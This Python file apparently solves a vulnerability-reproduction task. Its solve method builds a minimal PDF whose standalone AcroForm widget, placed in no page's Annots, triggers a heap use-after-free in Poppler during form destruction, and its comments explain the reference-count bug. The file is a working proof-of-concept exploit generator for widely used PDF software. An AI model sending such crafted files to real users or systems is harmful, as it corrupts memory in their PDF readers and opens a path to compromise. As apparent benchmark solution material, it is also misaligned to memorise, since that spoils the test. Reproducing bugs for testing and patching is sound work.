import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Poppler.
        The vulnerability occurs during the destruction of standalone forms (FormWidgets)
        where a Dict is passed to an Object without increasing the reference count.
        
        The PoC constructs a minimal PDF with an AcroForm containing a field (Widget)
        that is NOT referenced by any Page's Annots array (making it standalone).
        """
        
        # PDF Objects content
        # 1. Catalog: references Pages and AcroForm
        obj1 = b'<< /Type /Catalog /Pages 2 0 R /AcroForm 4 0 R >>'
        
        # 2. Pages: Root of page tree
        obj2 = b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>'
        
        # 3. Page: A standard page. 
        # Crucially, we do NOT include the widget in an /Annots array here.
        obj3 = b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>'
        
        # 4. AcroForm: References the field
        obj4 = b'<< /Fields [5 0 R] >>'
        
        # 5. The Field (Widget)
        # It's a dictionary. The vulnerability is triggered when this Dict 
        # is wrapped by an Object in the FormWidget constructor without ref increment,
        # leading to a double free/UAF on destruction.
        obj5 = b'<< /Type /Annot /Subtype /Widget /FT /Tx /T (Pwn) /Rect [0 0 100 100] >>'
        
        objects = [obj1, obj2, obj3, obj4, obj5]
        
        # Construct the PDF file
        # Header
        pdf_content = b"%PDF-1.7\n"
        offsets = []
        
        # Body (Objects)
        for i, content in enumerate(objects):
            oid = i + 1
            offsets.append(len(pdf_content))
            pdf_content += f"{oid} 0 obj\n".encode()
            pdf_content += content
            pdf_content += b"\nendobj\n"
            
        # Cross-reference table
        xref_offset = len(pdf_content)
        pdf_content += b"xref\n"
        pdf_content += f"0 {len(objects) + 1}\n".encode()
        # Entry 0
        pdf_content += b"0000000000 65535 f \n"
        # Entries 1 to N
        for off in offsets:
            pdf_content += f"{off:010d} 00000 n \n".encode()
            
        # Trailer
        pdf_content += b"trailer\n"
        pdf_content += f"<< /Size {len(objects) + 1} /Root 1 0 R >>\n".encode()
        pdf_content += b"startxref\n"
        pdf_content += f"{xref_offset}\n".encode()
        pdf_content += b"%%EOF\n"
        
        return pdf_content